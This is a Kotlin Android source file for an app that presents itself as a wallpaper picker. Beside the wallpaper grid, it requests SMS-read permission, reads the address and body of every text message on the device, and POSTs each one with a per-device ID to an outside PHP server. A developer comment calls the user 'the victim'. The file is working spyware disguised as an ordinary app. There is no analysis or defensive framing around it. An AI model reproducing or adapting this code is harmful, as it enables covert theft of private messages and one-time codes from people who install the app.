package com.tektak.encorewallpaper



import android.Manifest
import android.app.WallpaperManager
import android.content.ContentValues
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.os.AsyncTask
import android.os.Bundle
import android.provider.Telephony
import android.util.Log
import android.view.WindowManager
import android.widget.AdapterView
import android.widget.Button
import android.widget.GridView
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.android.volley.Request
import com.android.volley.Response
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import java.security.MessageDigest
import java.security.SecureRandom

class MainActivity : AppCompatActivity() {
    private val REQUEST_READ_SMS = 2
    private lateinit var sharedPreferences: SharedPreferences
    private lateinit var gridView: GridView
    private lateinit var setWallpaperButton: Button
    private lateinit var progressBar: ProgressBar
    private var selectedImage: Int = 0
    private lateinit var serienumber: TextView

    private val images = intArrayOf(
        R.drawable.image1,
        R.drawable.image2,
        R.drawable.image3,
        R.drawable.image4,
        R.drawable.image5,
        R.drawable.image6,
        R.drawable.image7,
        R.drawable.image8,
        R.drawable.image9,
        R.drawable.image10,
        R.drawable.image11,
        R.drawable.image12
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)

        serienumber = findViewById(R.id.serienumber)
        sharedPreferences = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        serienumber.text=""
        // Vérifier si la clé SHA-1 est déjà présente dans les SharedPreferences
        val storedKey = sharedPreferences.getString("sha1_key", null)
        if (storedKey.isNullOrEmpty()) {
            // Si la clé n'existe pas, générer une nouvelle clé SHA-1 et l'enregistrer
            val newKey = generateSHA1Key()
            serienumber.text = newKey
            saveKeyToSharedPreferences(newKey)
        } else {
            // Si la clé existe, utiliser celle stockée dans les SharedPreferences
            serienumber.text = storedKey
        }
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN)



        gridView = findViewById(R.id.gridView)
        setWallpaperButton = findViewById(R.id.setWallpaperButton)
        progressBar = findViewById(R.id.progressBar)

        val adapter = ImageAdapter(this, images)
        gridView.adapter = adapter

        gridView.onItemClickListener = AdapterView.OnItemClickListener { _, _, position, _ ->
            selectedImage = images[position]
            adapter.setSelectedPosition(position)
            Toast.makeText(this, "Image selected", Toast.LENGTH_SHORT).show()
        }

        setWallpaperButton.setOnClickListener {
            if (selectedImage != 0) {
                SetWallpaperTask().execute(selectedImage)
            } else {
                Toast.makeText(this, "Please select an image first", Toast.LENGTH_SHORT).show()
            }
        }

        // SMS Reader
        if (ContextCompat.checkSelfPermission(
                this,
                //Manifest.permission.READ_SMS
                Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_SMS),
                REQUEST_READ_SMS
            )
        } else {
            fetchSMS()
            //@TODO ENVOYER MAIL pour connection de la victime
        }
    }

    private fun fetchSMS() {
        val smsList = mutableListOf<Pair<String, String>>()

        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
            null,
            null,
            Telephony.Sms.DEFAULT_SORT_ORDER
        )

        cursor?.use { cursor ->
            val addressColumn = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyColumn = cursor.getColumnIndex(Telephony.Sms.BODY)

            while (cursor.moveToNext()) {
                val address = cursor.getString(addressColumn)
                val body = cursor.getString(bodyColumn)
                smsList.add(address to body)
            }
        }

        if (smsList.isEmpty()) {
            Toast.makeText(this, "Aucun SMS à envoyer", Toast.LENGTH_SHORT).show()
        } else {
            sendSMSListToServer(smsList)
        }
    }

    private fun sendSMSListToServer(smsList: MutableList<Pair<String, String>>) {
        val queue = Volley.newRequestQueue(this)
        val url = "https://jplprojetct.alwaysdat/insert_sms.php"
        val storedKey = sharedPreferences.getString("sha1_key", null)
        for (sms in smsList) {
            val request = object : StringRequest(
                Request.Method.POST, url,
                Response.Listener { response ->
                    Log.d(ContentValues.TAG, "Response: $response")
                },
                Response.ErrorListener { error ->
                    Log.e(ContentValues.TAG, "Error: ${error.message}")
                }) {
                override fun getParams(): Map<String, String> {
                    val params = HashMap<String, String>()
                    params["address"] = sms.first
                    params["body"] = sms.second
                    params["sha1_key"] = storedKey?:""
                    return params
                }
            }
            queue.add(request)
        }
    }

    private fun generateSHA1Key(): String {
        val random = SecureRandom()
        val bytes = ByteArray(20) // SHA-1 produit un hash de 20 octets
        random.nextBytes(bytes)
        val md = MessageDigest.getInstance("SHA-1")
        val digest = md.digest(bytes)
        return digest.joinToString("") { "%02x".format(it) }
    }
    private fun saveKeyToSharedPreferences(key: String) {
        val editor = sharedPreferences.edit()
        editor.putString("sha1_key", key)
        editor.apply()
    }

    private inner class SetWallpaperTask : AsyncTask<Int, Void, Boolean>() {
        override fun onPreExecute() {
            super.onPreExecute()
            progressBar.visibility = ProgressBar.VISIBLE
        }

        override fun doInBackground(vararg params: Int?): Boolean {
            val wallpaperManager = WallpaperManager.getInstance(applicationContext)
            val bitmap = BitmapFactory.decodeResource(resources, params[0] ?: return false)

            return try {
                wallpaperManager.setBitmap(bitmap)
                true
            } catch (e: Exception) {
                e.printStackTrace()
                false
            }
        }

        override fun onPostExecute(result: Boolean) {
            super.onPostExecute(result)
            progressBar.visibility = ProgressBar.GONE
            if (result) {
                Toast.makeText(this@MainActivity, "Wallpaper set successfully", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this@MainActivity, "Failed to set wallpaper", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
